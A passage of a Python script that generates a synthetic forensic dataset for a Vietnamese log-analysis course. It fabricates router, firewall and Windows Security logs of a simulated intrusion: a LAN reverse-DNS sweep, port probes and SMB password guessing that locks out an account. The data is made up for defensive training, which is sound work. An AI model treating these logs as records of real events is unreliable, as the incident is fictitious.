    "Device: 252,1	Inode: 1311042     Links: 1", "Access: (0644/-rw-r--r--)  Uid: (   33/www-data)   Gid: (   33/www-data)",
    "Access: 2026-11-22 02:31:20.118204331 +0700", "Modify: 2026-11-02 10:14:00.000000000 +0700", "Change: 2026-11-21 23:05:51.602117480 +0700",
    " Birth: 2026-11-21 23:05:44.871933015 +0700",
    "  File: /var/log/auth.log.1", "  Size: " + str(len("\n".join(tuan_truoc).encode()) + 1) + "     	Blocks: 1208       IO Block: 4096   regular file",
    "Device: 252,1	Inode: 1572961     Links: 1", "Access: (0640/-rw-r-----)  Uid: (    0/    root)   Gid: (    4/     adm)",
    "Access: 2026-11-23 08:44:02.551029118 +0700", "Modify: 2026-11-21 23:19:55.204431907 +0700", "Change: 2026-11-22 00:00:01.913502250 +0700",
    " Birth: 2026-11-21 23:19:55.201760385 +0700"])
ghi("vps01/thu-thap/env.txt", ["$ ls -l /opt/tour-api/.env", "-rw-r--r-- 1 deploy deploy 412 Oct  1 09:12 /opt/tour-api/.env",
    "$ sudo grep -c PASSWORD /opt/tour-api/.env", "2"])
ghi("vps01/thu-thap/docker-ps.txt", ["$ sudo docker ps -a --format '{{.ID}} {{.Image}} {{.Names}} {{.Status}}'",
    f"{ID_API[:12]} ghcr.io/hoasen/tour-api:2.14.0 tour-api Up 4 days", f"{ID_DB[:12]} postgres:16 tour-db Up 7 weeks",
    "$ sudo docker images alpine --format '{{.Repository}}:{{.Tag}} {{.CreatedSince}}'", "alpine:3.20 3 months ago"])

# ───────────────────────── rt01 (router văn phòng, OpenWrt-like) ─────────────────────────
rt = Nhat(); up0 = vn("2026-10-30 07:12:00")
def R(t, fac, prog, msg):
    tr = t - timedelta(seconds=LECH_RT01)   # đồng hồ router chậm
    rt.them(t, f"{THU[tr.weekday()]} {THANG[tr.month-1]} {tr.day:2d} {tr:%H:%M:%S} {tr.year} {fac} {prog}: {msg}")
def KR(t, msg):
    up = (t - up0).total_seconds() + r.num(1000) / 1e6
    R(t, "kern.warn", "kernel", f"[{up:12.6f}] {msg}")
def syn(t, src, dst, dpt, spt=None):
    spt = spt or 32768 + r.num(28000)
    KR(t, f"wg-lan: IN=wg0 OUT=br-lan MAC= SRC={src} DST={dst} LEN=60 TOS=0x00 PREC=0x00 TTL=63 ID={r.num(65535)} DF PROTO=TCP SPT={spt} DPT={dpt} WINDOW=64240 RES=0x00 SYN URGP=0")
    return spt
MAY = {"10.20.0.15": ("pc-dev01", "3c:52:82:1a:7e:05"), "10.20.0.16": ("pc-ketoan", "3c:52:82:1a:91:c2"), "10.20.0.20": ("nas01", "00:11:32:aa:40:19"), "10.20.0.31": ("dt-an", "6e:2f:9b:10:03:77")}
TEN_MIEN = ["www.google.com", "mail.google.com", "outlook.office365.com", "zalo.me", "github.com", "registry.npmjs.org", "hoasen.example", "teams.microsoft.com", "www.youtube.com"]
d = T0
while d < T1:
    t = d + timedelta(hours=1, minutes=0, seconds=4)   # vps01 sao lưu CSDL về NAS mỗi đêm 01:00 qua đường hầm (rsync 873) — đường nền
    if t < T1: syn(t, "10.8.0.1", "10.20.0.20", 873)
    if ngay_lam(d) or d.weekday() == 5:
        for ip, (ten, mac) in MAY.items():
            if ip == "10.20.0.20": continue
            if d.weekday() == 5 and ip != "10.20.0.31": continue
            t = vn(f"{d:%Y-%m-%d} 08:{10 + r.num(30)}:{r.num(60):02d}")
            if t >= T1: continue
            R(t, "daemon.info", "dnsmasq-dhcp[1432]", f"DHCPREQUEST(br-lan) {ip} {mac}"); R(t + timedelta(milliseconds=3), "daemon.info", "dnsmasq-dhcp[1432]", f"DHCPACK(br-lan) {ip} {mac} {ten}")
            for k in range(60 + r.num(60)):
                tq = t + timedelta(seconds=r.num(9 * 3600))
                if tq >= T1: continue
                q = r.pick(TEN_MIEN); R(tq, "daemon.info", "dnsmasq[1432]", f"query[A] {q} from {ip}"); R(tq + timedelta(milliseconds=2), "daemon.info", "dnsmasq[1432]", f"forwarded {q} to 1.1.1.1")
    d += timedelta(days=1)
# Sự cố: 22:52:40 quét DNS ngược 10.20.0.1–254 từ 10.8.0.1; 22:55 SYN 445/3389; 22:56–22:57 SMB vào PC-DEV01 (khớp 4625 bằng cổng nguồn)
t = vn("2026-11-21 22:52:40")
for i in range(1, 255):
    ip = f"10.20.0.{i}"; ten = {"10.20.0.1": "rt01.lan"} | {k: v[0] + ".lan" for k, v in MAY.items()}
    tq = t + timedelta(milliseconds=24 * i)
    R(tq, "daemon.info", "dnsmasq[1432]", f"query[PTR] {i}.0.20.10.in-addr.arpa from 10.8.0.1")
    R(tq + timedelta(microseconds=300), "daemon.info", "dnsmasq[1432]", f"/tmp/hosts/dhcp.cfg01411c {ip} is {ten[ip]}" if ip in ten else f"config {i}.0.20.10.in-addr.arpa is NXDOMAIN")
for ip, ports in (("10.20.0.15", (445, 3389)), ("10.20.0.16", (445, 3389)), ("10.20.0.20", (445, 22))):
    for pt in ports: syn(vn("2026-11-21 22:55:10") + timedelta(milliseconds=r.num(900)), "10.8.0.1", ip, pt)
SMB = [("Administrator", "0xc0000072"), ("admin", "0xc0000064"), ("hoasen", "0xc0000064")] + [("minh", "0xc000006a")] * 10 + [("minh", "0xc0000234")] * 2
smb_ports = []
t = vn("2026-11-21 22:56:30")
for u, st in SMB:
    smb_ports.append((t, u, st, syn(t, "10.8.0.1", "10.20.0.15", 445))); t += timedelta(seconds=5 + r.num(4), milliseconds=r.num(1000))
ghi("rt01/logread.txt", rt.dong())
ghi("rt01/thu-thap/firewall.txt", ["$ uci show firewall | grep -E 'zone|forwarding' | grep -E 'wg|lan'",
    "firewall.@zone[0].name='lan'", "firewall.@zone[2].name='wg'", "firewall.@zone[2].network='wg0'", "firewall.@zone[2].input='ACCEPT'", "firewall.@zone[2].forward='ACCEPT'",
    "firewall.@forwarding[1].src='wg'", "firewall.@forwarding[1].dest='lan'",
    "$ uci show firewall.log_wg_lan", "firewall.log_wg_lan=rule", "firewall.log_wg_lan.name='log-wg-lan'", "firewall.log_wg_lan.src='wg'", "firewall.log_wg_lan.dest='lan'",
    "firewall.log_wg_lan.proto='tcp'", "firewall.log_wg_lan.target='ACCEPT'", "firewall.log_wg_lan.log='1'", "firewall.log_wg_lan.log_prefix='wg-lan: '",
    "$ wg show wg0 allowed-ips", "nX4pQ7kE2vB9sLw1Zt5Yc8Rm3Ud6Hf0Ga4Ji7Ko2Ns=	10.8.0.1/32",
    "$ date; uci get system.ntp.enabled", f"Mon Nov 23 {(vn('2026-11-23 09:20:30') - timedelta(seconds=LECH_RT01)):%H:%M:%S} +07 2026", "0"])

# ───────────────────────── PC-DEV01 (Windows 11, bản xuất Security log) ─────────────────────────
win = []; rec = [183900]
SID_MINH = "S-1-5-21-3623811015-3361044348-30300820-1001"
def E(t, eid, data):
    rec[0] += 1 + r.num(3); tu = t.astimezone(UTC)
    win.append((tu, {"TimeCreated": tu.strftime("%Y-%m-%dT%H:%M:%S.") + f"{tu.microsecond:06d}0Z", "Id": eid, "RecordId": rec[0], "MachineName": "PC-DEV01",
                     "LogName": "Security", "ProviderName": "Microsoft-Windows-Security-Auditing", "Data": data}))
def dn(t, kieu, lid):
    E(t, 4624, {"SubjectUserName": "PC-DEV01$", "TargetUserSid": SID_MINH, "TargetUserName": "minh", "TargetDomainName": "PC-DEV01", "TargetLogonId": lid, "LogonType": str(kieu),
                "LogonProcessName": "User32 ", "AuthenticationPackageName": "Negotiate", "WorkstationName": "PC-DEV01", "IpAddress": "127.0.0.1", "IpPort": "0", "ElevatedToken": "%%1842"})
    E(t + timedelta(milliseconds=2), 4672, {"SubjectUserSid": SID_MINH, "SubjectUserName": "minh", "SubjectDomainName": "PC-DEV01", "SubjectLogonId": lid,
                                             "PrivilegeList": "SeSecurityPrivilege SeTakeOwnershipPrivilege SeLoadDriverPrivilege SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege"})
d = T0
while d < T1:
    if ngay_lam(d):
        t = vn(f"{d:%Y-%m-%d} 08:{20 + r.num(15)}:{r.num(60):02d}")
        if t < T1:
            if r.num(4) == 0:
                E(t - timedelta(seconds=9), 4625, {"TargetUserName": "minh", "TargetDomainName": "PC-DEV01", "Status": "0xc000006d", "SubStatus": "0xc000006a", "LogonType": "2",
                    "LogonProcessName": "User32 ", "AuthenticationPackageName": "Negotiate", "WorkstationName": "PC-DEV01", "IpAddress": "127.0.0.1", "IpPort": "0"})
            dn(t, 2, f"0x{r.num(0xffffff):x}")
            if d.date() != T1.date():
                for gio in ("12:4", "15:1"):
                    tu = vn(f"{d:%Y-%m-%d} {gio}{r.num(10)}:{r.num(60):02d}"); dn(tu, 7, f"0x{r.num(0xffffff):x}")
                E(vn(f"{d:%Y-%m-%d} 18:0{r.num(10)}:{r.num(60):02d}"), 4647, {"TargetUserSid": SID_MINH, "TargetUserName": "minh", "TargetDomainName": "PC-DEV01", "TargetLogonId": "0x0"})
    d += timedelta(days=1)
for (t, u, st, spt) in smb_ports:
    E(t + timedelta(milliseconds=180 + r.num(60)), 4625, {"SubjectUserSid": "S-1-0-0", "SubjectUserName": "-", "SubjectDomainName": "-", "SubjectLogonId": "0x0",
        "TargetUserSid": "S-1-0-0", "TargetUserName": u, "TargetDomainName": "WORKGROUP", "Status": "0xc000006d" if st != "0xc0000234" else "0xc0000234",
        "FailureReason": {"0xc0000072": "%%2310", "0xc0000064": "%%2313", "0xc000006a": "%%2313", "0xc0000234": "%%2307"}[st], "SubStatus": st if st != "0xc0000234" else "0x0",
        "LogonType": "3", "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM", "WorkstationName": ID_KE[:12].upper(), "TransmittedServices": "-",
        "LmPackageName": "-", "KeyLength": "0", "ProcessId": "0x0", "ProcessName": "-", "IpAddress": "10.8.0.1", "IpPort": str(spt)})
    if u == "minh" and st == "0xc000006a" and sum(1 for e in win if e[1]["Id"] == 4625 and e[1]["Data"].get("TargetUserName") == "minh" and e[1]["Data"].get("IpAddress") == "10.8.0.1") == 10:
        E(t + timedelta(milliseconds=260), 4740, {"TargetUserName": "minh", "TargetDomainName": ID_KE[:12].upper(), "TargetSid": SID_MINH, "SubjectUserSid": "S-1-5-18",
                                                  "SubjectUserName": "PC-DEV01$", "SubjectDomainName": "WORKGROUP", "SubjectLogonId": "0x3e7"})
win.sort(key=lambda x: x[0])
ghi("pc-dev01/security.jsonl", [json.dumps(e, ensure_ascii=False, separators=(",", ":")) for _, e in win])
ghi("pc-dev01/XUAT.ps1.txt", ["# Lệnh Minh chạy trên PC-DEV01 (PowerShell 7, quyền quản trị) sáng 23/11/2026 để xuất Security log thành JSON mỗi dòng một sự kiện:",
    "Get-WinEvent -FilterHashtable @{ LogName = 'Security'; StartTime = '2026-11-15'; Id = 4624, 4625, 4647, 4672, 4740 } | Sort-Object RecordId | ForEach-Object {",
    "  $x = [xml]$_.ToXml(); $d = [ordered]@{}; $x.Event.EventData.Data | ForEach-Object { $d[$_.Name] = $_.'#text' }",
    "  [ordered]@{ TimeCreated = $_.TimeCreated.ToUniversalTime().ToString('o'); Id = $_.Id; RecordId = $_.RecordId; MachineName = 'PC-DEV01'",
    "    LogName = $_.LogName; ProviderName = $_.ProviderName; Data = $d } | ConvertTo-Json -Compress",
    "} | Set-Content -Encoding utf8NoBOM security.jsonl",
    "# (Bộ dữ liệu này là bản SINH đúng dạng output của lệnh trên — xem bài 18.1. Bớt trường SID/LogonGuid không dùng tới cho gọn.)"])

ghi("DE-BAI.txt", [
    "SỰ CỐ HOA SEN TRAVEL — bộ dữ liệu dự án cuối khoá (Chương 18, khoá 'Đọc & làm chủ log từ A–Z', cuongthai.com).",
    "Thứ Hai 23/11/2026 08:33 (+07:00): báo cáo buổi sáng trên PC-DEV01 của Minh (lập trình viên) có sự kiện 4740 — tài khoản minh bị khoá lúc tối thứ Bảy,",
    "khi không ai ở văn phòng. An (quản trị) vào vps01, thu thập log 08:41–09:06 và giao cho bạn. Công ty: 6 người, một VPS và một văn phòng.",
    "",
    "  vps01  192.0.2.10   Ubuntu 24.04 — sshd, cron, rsyslog + journald, nginx 1.24 (+ PHP-FPM 8.3 cho blog WordPress), Docker:",
    "                      tour-api (Node.js 22 + pino, cổng 3000 sau nginx), tour-db (PostgreSQL 16, cổng 5432 chỉ mở 127.0.0.1). WireGuard wg0 = 10.8.0.1.",
    "  rt01   192.0.2.200  router văn phòng (kiểu OpenWrt): dnsmasq (DHCP + DNS, ghi truy vấn), tường lửa, WireGuard 10.8.0.2 ↔ vps01. LAN 10.20.0.0/24.",
    "  PC-DEV01 10.20.0.15 Windows 11 của Minh (bản xuất Security log JSON, xem pc-dev01/XUAT.ps1.txt).",
    "  Người dùng thật trên vps01: an (quản trị, sudo), minh (lập trình), deploy (tài khoản triển khai). Văn phòng ra Internet bằng 192.0.2.200.",
    "",
    "Nguồn: vps01/var/log (auth.log*, syslog*, nginx), vps01/journal/vps01-journal.json (journalctl -o json), vps01/postgresql/log/*.csv (csvlog),",
    "       vps01/var/lib/docker/containers/<id>/<id>-json.log (log của tour-api), vps01/thu-thap/ (output lệnh An chạy), rt01/logread.txt + rt01/thu-thap/,",
    "       pc-dev01/security.jsonl.",
    "Nhiệm vụ: trả lời 15 câu hỏi của bài 18.1 bằng bằng chứng (trích dòng log), dựng dòng thời gian UTC, gắn ATT&CK, viết báo cáo (bài 18.3–18.5).",
    "Quy tắc: KHÔNG mở lời giải trước khi tự làm xong. Mọi giờ trong báo cáo ghi theo UTC. Đây là dữ liệu SINH (tao-su-co.py) — không có người thật nào bị hại."])
tong = 0
for goc, _, tep in os.walk(GOC):
    for f in tep: tong += os.path.getsize(os.path.join(goc, f))
print(f"su-co18: {sum(len(f) for _, _, f in os.walk(GOC))} tệp, {tong / 1e6:.1f} MB → {GOC}")
